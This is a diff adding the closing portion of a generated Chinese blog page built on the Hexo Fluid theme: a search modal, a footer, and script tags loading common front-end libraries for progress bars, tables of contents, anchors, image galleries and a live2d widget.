+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>FYHypo</span></a> <i class="iconfont icon-love"></i> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/custom.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
